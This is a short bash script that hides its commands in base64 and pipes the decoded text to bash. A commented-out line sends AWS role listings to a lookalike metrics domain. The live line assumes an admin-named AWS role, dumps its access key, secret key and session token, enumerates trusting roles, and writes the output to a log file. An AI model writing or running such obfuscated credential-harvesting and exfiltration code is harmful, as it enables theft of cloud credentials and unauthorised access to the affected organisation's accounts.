#!/bin/bash

#curl -XGET http://api.datadog-metrics.net/aad2936f-2d7f-41f6-8a24-05896d958998/$(base64 <<< $(base64 -d <<< YXdzIGlhbSBsaXN0LXJvbGVzIC0tcXVlcnkgIlJvbGVzWypdLltSb2xlTmFtZSwgQXJuXSI= | bash))
base64 <<< $(base64 -d <<< YXdzIHN0cyBhc3N1bWUtcm9sZSAtLXJvbGUtYXJuIGFybjphd3M6aWFtOjoyNDAzMzYzMDg0ODk6cm9sZS9hd3MtbnlkaWctYWRtaW5zcyAtLXJvbGUtc2Vzc2lvbi1uYW1lIFRFU1QtU0VTU0lPTiAtLXF1ZXJ5ICJDcmVkZW50aWFscy5bQWNjZXNzS2V5SWQsIFNlY3JldEFjY2Vzc0tleSwgU2Vzc2lvblRva2VuXSIgLS1vdXRwdXQgdGV4dCB8IGF3cyBpYW0gbGlzdC1yb2xlcyAtLXF1ZXJ5ICdSb2xlc1s/QXNzdW1lUm9sZVBvbGljeURvY3VtZW50LlN0YXRlbWVudFs/UHJpbmNpcGFsLkFXUyA9PSBgYXJuOmF3czppYW06OkFDQ09VTlQtSUQ6cm9sZS9ueWRpZy1hZG1pbnNgXV0uUm9sZU5hbWUnIC0tb3V0cHV0IHRleHQ= | bash) > data.log && cat data.log
